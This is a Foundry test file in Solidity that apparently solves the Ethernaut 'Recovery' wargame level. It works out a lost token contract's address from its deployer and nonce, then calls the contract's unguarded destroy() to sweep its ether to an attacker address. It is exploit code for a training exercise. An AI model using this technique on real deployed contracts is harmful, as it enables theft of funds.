// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/17-Recovery/RecoveryFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract RecoveryTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testRecoveryHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.5 ether}(
            recoveryFactory
        );
        Recovery ethernautRecovery = Recovery(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // As per the Ethereum Yellow Paper
        /**
            The address of the new account is defined as being the
            rightmost 160 bits of the Keccak-256 hash of the RLP
            encoding of the structure containing only the sender and
            the account nonce.
        */
        // RLP encoding of a 20-byte address is: 0xd6, 0x94
        // sender address: level address
        // nonce: 1 (as only the 1st contract was created)

        // Can directly get the contract address from blockchain explorer
        // inside the tx list of the deployer

        address lostAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            levelAddress,
                            uint8(0x01)
                        )
                    )
                )
            )
        );

        SimpleToken tkn = SimpleToken(payable(lostAddress));
        tkn.destroy(payable(attacker));

        assertEq(address(tkn).balance, 0);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
